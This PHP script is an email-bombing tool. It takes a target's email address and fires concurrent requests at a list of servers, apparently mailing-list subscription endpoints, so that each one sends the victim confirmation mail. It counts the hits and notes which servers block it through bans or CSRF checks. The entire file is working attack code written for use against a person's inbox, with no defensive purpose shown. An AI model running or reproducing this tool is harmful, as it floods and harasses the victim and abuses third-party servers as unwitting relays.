<?php
use GuzzleHttp\Pool;
use GuzzleHttp\Psr7\Request;
if($argc<3){
    println('Please enter the email address of the target.');
    exit;
}
if($argc==4 && $argv[2]=='refined'){
    $email=$argv[3];
    $useRefined=true;
}else{
    $email=$argv[2];
    $useRefined=false;
}
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    println('Please enter a valid email address.');
    exit;
}
if($useRefined){
    if(!file_exists(REFINED_NODES_JSON)){
        println('Please run update-nodes and refine-nodes first.');
        exit;
    }
    $nodes=json_decode(file_get_contents(REFINED_NODES_JSON));
}else{
    if(!file_exists(NODES_JSON)){
        println('Please run update-nodes first.');
        exit;
    }
    $nodes=json_decode(file_get_contents(NODES_JSON));
}
shuffle($nodes);

$requests = function ($total) {
    global $nodes,$email;
    if(is_infinite($total)){
        $limit=count($nodes);
    }else {
        $limit = (count($nodes) > $total) ? $total : count($nodes);
    }
    println('Creating '.$limit.' requests...');
    foreach ($nodes as $i=>$node){
        yield new Request('GET', build_bombing_url($node,$email));
        if($i==$limit-1){
            break;
        }
    }
};
$totalSuccess=0;
$totalFailure=0;
$pool = new Pool($guzzle, $requests(USE_NODES_COUNT), [
    'concurrency' => CONCURRENCY,
    'fulfilled' => function ($response, $index) {
        global $totalFailure,$totalSuccess;
        $html=$response->getBody();
        if(strpos($html,'is banned')){
            $totalFailure++;
            println("[SUCCESS:{$totalSuccess}, FAILURE:{$totalFailure}]".'Request with index '.$index.' failed. Reason: the target email address is banned from the server.');
        }else if(strpos($html,'be acted upon') || strpos($html,'Confirmation from your email')){
            $totalSuccess++;
            println("[SUCCESS:{$totalSuccess}, FAILURE:{$totalFailure}]".'Request with index '.$index.' succeeded.');
        }else if(strpos($html,'no hidden token')){
            $totalFailure++;
            println("[SUCCESS:{$totalSuccess}, FAILURE:{$totalFailure}]".'Request with index '.$index.' failed. Reason: the server forces a CSRF check.');
        }else{
            $totalFailure++;
            println("[SUCCESS:{$totalSuccess}, FAILURE:{$totalFailure}]".'Request with index '.$index.' failed. Reason: not clear.');
        }
    },
    'rejected' => function ($reason, $index) {
        global $totalFailure,$totalSuccess;
        $totalFailure++;
        println("[SUCCESS:{$totalSuccess}, FAILURE:{$totalFailure}]".'Request with index '.$index.' failed. Reason: connection cannot be made.');
    },
]);

$promise = $pool->promise();

$promise->wait();